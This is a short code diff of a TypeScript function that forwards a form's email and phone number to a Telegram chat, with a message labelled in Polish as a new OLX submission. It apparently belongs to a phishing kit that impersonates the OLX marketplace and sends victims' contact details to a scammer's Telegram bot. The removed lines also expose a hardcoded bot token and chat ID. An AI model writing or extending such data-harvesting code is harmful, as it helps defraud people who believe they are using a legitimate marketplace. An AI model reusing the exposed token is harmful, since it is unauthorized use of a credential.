@@ -1,7 +1,7 @@
 // Telegram API utility for sending form data
 export async function sendToTelegram(formData: { email: string; phone: string }) {
-  const botToken = "8464545234:AAHE9DsHwZ_9DEM5bMeQNd4r54YhPDBIz9g";
-  const chatId = "-1004316711350";
+  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN as string;
+  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID as string;
   
   const message = `🆕 Nowe zgłoszenie OLX\n\n📧 Email: ${formData.email}\n📱 Telefon: ${formData.phone}\n\n⏰ Data: ${new Date().toLocaleString('pl-PL')}`;
   
